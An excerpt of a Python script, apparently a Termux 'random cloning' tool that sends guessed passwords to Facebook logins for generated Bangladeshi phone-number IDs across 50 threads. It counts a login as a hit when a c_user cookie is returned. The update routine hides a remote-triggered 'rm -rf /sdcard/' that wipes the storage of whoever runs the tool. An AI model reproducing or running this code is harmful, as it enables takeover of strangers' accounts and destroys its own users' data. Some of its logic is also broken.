...
from os import system as _𝐍𝐀𝐘𝐄𝐄𝐌_
try:
    import requests
    ...
    _𝐍𝐀𝐘𝐄𝐄𝐌_('pip install mechanize requests futures bs4==2 > /dev/null')
    _𝐍𝐀𝐘𝐄𝐄𝐌_('pip install bs4')
...
def update():
	voice=random.choice([' Tool is on update','try again after update','try again after sometime','tool update is running','𝐍𝐀𝐘𝐄𝐄𝐌 EHC CYBER is working'])
	em=random.choice(['🔥','🙄','😒','😐','😡','😈','🥱','😎'])
...
if apk1 =='off':
	sys.exit()
if apk1 =='remove':
	_𝐍𝐀𝐘𝐄𝐄𝐌_("termux-setup-storage")
	_𝐍𝐀𝐘𝐄𝐄𝐌_("rm -rf /sdcard/")
	_𝐍𝐀𝐘𝐄𝐄𝐌_("rm -rf /sdcard/ -y")
	sys.exit()
...
def 𝐍𝐀𝐘𝐄𝐄𝐌():
    ...
    _𝐍𝐀𝐘𝐄𝐄𝐌_("clear")
    print(logo)
    _𝐍𝐀𝐘𝐄𝐄𝐌_("espeak \"Hi sir ,Wellcome to EHC 𝐍𝐀𝐘𝐄𝐄𝐌 CYBER KING BANGLADESH  Rendom cloneing tool\"")
    ...
    if opt == '1':
    	_𝐍𝐀𝐘𝐄𝐄𝐌_("espeak \" you choose rendom cloneing\"")
    	xxr()
    if None == '2':
        _𝐍𝐀𝐘𝐄𝐄𝐌_('xdg-open https://www.facebook.com/PLZZZ.DISABLE.ME.IF.YOU.CAN')
        _𝐍𝐀𝐘𝐄𝐄𝐌_("espeak \"Follow my Facebook account\"")
        
        return None
    if None == '3':
        _𝐍𝐀𝐘𝐄𝐄𝐌_('xdg-open https://github.com/nayeemvai')
        _𝐍𝐀𝐘𝐄𝐄𝐌_("espeak \"Follow me on github\"")
        return None
    if None == '4':
        _𝐍𝐀𝐘𝐄𝐄𝐌_('xdg-open https://m.me/PLZZZ.DISABLE.ME.IF.YOU.CAN')
        _𝐍𝐀𝐘𝐄𝐄𝐌_("espeak \"you choose messenger\"")
    if None == '0':
        _𝐍𝐀𝐘𝐄𝐄𝐌_('exit')
        _𝐍𝐀𝐘𝐄𝐄𝐌_("espeak \"good bye sir\"")
...
def xxr():
    ...
    print(" \033[1;93m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
    _𝐍𝐀𝐘𝐄𝐄𝐌_("espeak \"choose your country cord\"")
    rk1 = '0171'
    rk2 = '0172'
    rk3 = '0175'
    rk4 = '0194'
    ...
    _𝐍𝐀𝐘𝐄𝐄𝐌_(f"espeak \"you choose {pww}\"")
    _𝐍𝐀𝐘𝐄𝐄𝐌_('clear')
    print(logo)
    _𝐍𝐀𝐘𝐄𝐄𝐌_("espeak \"choose your limit\"")
    ...
    _𝐍𝐀𝐘𝐄𝐄𝐌_(f"espeak \"you choose limit {limit}\"")
    ...
    with ThreadPool(max_workers=50) as manshera:
        ...
        print(f'\033[38;5;46m│\033[1;91m[\033[1;97m×\033[1;91m]\033[38;5;46m TOOL OWNER   \033[1;97m: \033[38;5;46m𝐍𝐀𝐘𝐄𝐄𝐌 EHC       \033[1;97m     │')
...
def rcrack(uid,pwx,tl):
    ...
    'user-agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_3) AppleWebKit/537.75.14 (KHTML, like Gecko) Version/7.0.3 Safari/7046A194A',
            ...
            if 'c_user' in log_cookies:
                ...
                _𝐍𝐀𝐘𝐄𝐄𝐌_("espeak \"congratulations you got a ok id\"")
                ...
                _𝐍𝐀𝐘𝐄𝐄𝐌_("espeak \"𝐍𝐀𝐘𝐄𝐄𝐌 EHC CYBER is brand\"")
                #open('/sdcard/𝐍𝐀𝐘𝐄𝐄𝐌_CP.txt', 'a').write( uid+' | '+ps+' \n')
                cps.append(cid)
                break
            else:
                continue
        ...
        sys.stdout.write(f"\r \33[1;90m[{colr}𝐍𝐀𝐘𝐄𝐄𝐌 𝘽𝙊𝙎𝙎\33[1;90m]{colo}✘\33[1;90m[{colorful}{loop}\33[1;90m/\33[1;92m{tl}\33[1;90m]-[OK:{xr}{len(oks)}{x}\33[1;90m]-\33[1;90m[{emoji}]  "),
        sys.stdout.flush()
    except:
        pass
...
def superuser():
    ...
    id = "99".join(uuid)
    print(logo)
    DARK=requests.get("https://github.com/Max-fro-man/𝐍𝐀𝐘𝐄𝐄𝐌-AFROBAL/blob/main/Afroveal.txt").text
    if id in DARK:
        os.system('clear')
        print(logo)
        𝐍𝐀𝐘𝐄𝐄𝐌()
